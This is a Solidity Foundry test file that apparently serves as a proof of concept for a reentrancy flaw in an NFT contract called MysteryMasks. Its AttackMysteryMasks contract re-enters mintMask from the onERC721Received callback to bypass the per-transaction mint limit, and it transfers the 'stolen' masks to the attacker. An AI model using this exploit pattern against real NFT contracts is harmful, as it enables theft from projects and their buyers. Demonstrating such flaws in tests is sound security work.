// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Test, console} from "forge-std/Test.sol";
import {MysteryMasks} from "../src/MysteryMasks.sol";

contract AttackMysteryMasks is Ownable, IERC721Receiver {
    address mysteryMasksAddress;

    constructor(address _mysteryMasksAddress) Ownable(msg.sender) {
        mysteryMasksAddress = _mysteryMasksAddress;
    }

    function attackMintMask() external onlyOwner {
        MysteryMasks mysteryMasks = MysteryMasks(mysteryMasksAddress);

        mysteryMasks.mintMask{value: mysteryMasks.MINT_PRICE() * mysteryMasks.MAX_MINT_PER_TX()}(
            mysteryMasks.MAX_MINT_PER_TX()
        );
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        MysteryMasks mysteryMasks = MysteryMasks(mysteryMasksAddress);
        uint256 currentBalance = address(this).balance;

        // no more balance left on this contract for the next batch, stop stealing NFTs
        if (currentBalance < mysteryMasks.MINT_PRICE() * mysteryMasks.MAX_MINT_PER_TX()) {
            return IERC721Receiver.onERC721Received.selector;
        }

        mysteryMasks.mintMask{value: mysteryMasks.MINT_PRICE() * mysteryMasks.MAX_MINT_PER_TX()}(
            mysteryMasks.MAX_MINT_PER_TX()
        );

        return IERC721Receiver.onERC721Received.selector;
    }

    function transferStolenMasksToOwner(uint256[] calldata tokenIds) external onlyOwner {
        MysteryMasks mysteryMasks = MysteryMasks(mysteryMasksAddress);
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            mysteryMasks.safeTransferFrom(address(this), owner(), tokenIds[i]);
        }
    }
}

contract MysteryMasksTest is Test {
    address owner = address(0x1);
    address attacker = address(0x2);
    MysteryMasks public masks;
    AttackMysteryMasks public attack;
    uint256[] public tokenIds;

    function setUp() public {
        vm.prank(owner);
        masks = new MysteryMasks();

        vm.prank(attacker);
        attack = new AttackMysteryMasks(address(masks));
    }

    function testAttackMysteryMasks() public {
        vm.startPrank(attacker);
        // give enough funds to the attacker's contract to cover for minting expenses
        vm.deal(address(attack), 10 * masks.MINT_PRICE() * masks.MAX_MINT_PER_TX());
        attack.attackMintMask();

        // attacker's contract now has 10x more masks than it should
        uint256 numOfMasks = masks.balanceOf(address(attack));
        assertEq(10 * masks.MAX_MINT_PER_TX(), numOfMasks);

        // attacker transfers 4 stolen NFTs to attacker's EOA
        tokenIds.push(1);
        tokenIds.push(2);
        tokenIds.push(3);
        tokenIds.push(4);
        attack.transferStolenMasksToOwner(tokenIds);

        uint256 attackerTransferMasks = masks.balanceOf(attacker);
        uint256 numOfMasksAfterTransfer = masks.balanceOf(address(attack));
        assertEq(4, attackerTransferMasks);
        assertEq(10 * masks.MAX_MINT_PER_TX() - 4, numOfMasksAfterTransfer);
        vm.stopPrank();
    }
}
